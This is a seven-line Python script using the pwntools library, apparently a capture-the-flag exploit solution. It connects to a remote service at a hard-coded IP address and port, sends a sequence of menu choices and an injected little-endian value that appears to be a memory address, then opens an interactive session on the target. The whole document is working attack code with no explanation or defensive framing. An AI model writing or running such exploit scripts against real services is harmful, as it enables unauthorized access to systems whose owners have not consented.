from pwn import *
r = remote("161.35.33.243", 31823)
r.send("T\n")
r.send("S\n")
r.send("\xc9\x07\xcc\x00\x00\x00\x00\x00\n")
r.send("C\n")
r.interactive()
